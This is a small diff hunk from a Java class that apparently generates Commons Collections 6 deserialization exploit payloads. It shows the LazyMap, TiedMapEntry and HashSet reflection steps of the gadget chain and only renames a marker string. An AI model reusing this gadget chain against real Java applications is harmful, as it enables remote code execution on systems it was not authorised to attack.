@@ -45,9 +45,9 @@ public class commonscollections6 implements ObjectPayload<Serializable> {
 
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "nu1r");
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "QI4L");
         HashSet map = new HashSet(1);
-        map.add("nu1r");
+        map.add("QI4L");
         Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
